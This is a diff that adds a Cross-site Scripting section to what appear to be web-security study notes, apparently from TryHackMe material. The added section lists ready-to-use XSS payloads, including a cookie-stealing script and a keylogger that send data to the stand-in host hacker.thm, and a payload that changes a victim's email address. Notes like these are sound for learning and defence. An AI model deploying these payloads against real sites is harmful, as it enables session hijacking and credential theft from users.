@@ -157,3 +157,13 @@ If working with a blind SSRF where no output is reflected back to you, you'll ne
      An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.  
 
 
+## Cross-site Scripting
+Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.     
+
+### XSS Payloads
+- Proof Of Concept: `<script>alert('XSS');</script>`
+- Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`   
+- Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
+- Business Logic: For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:`<script>user.changeEmail('attacker@hacker.thm');</script>`     
+
+### Reflected XSS
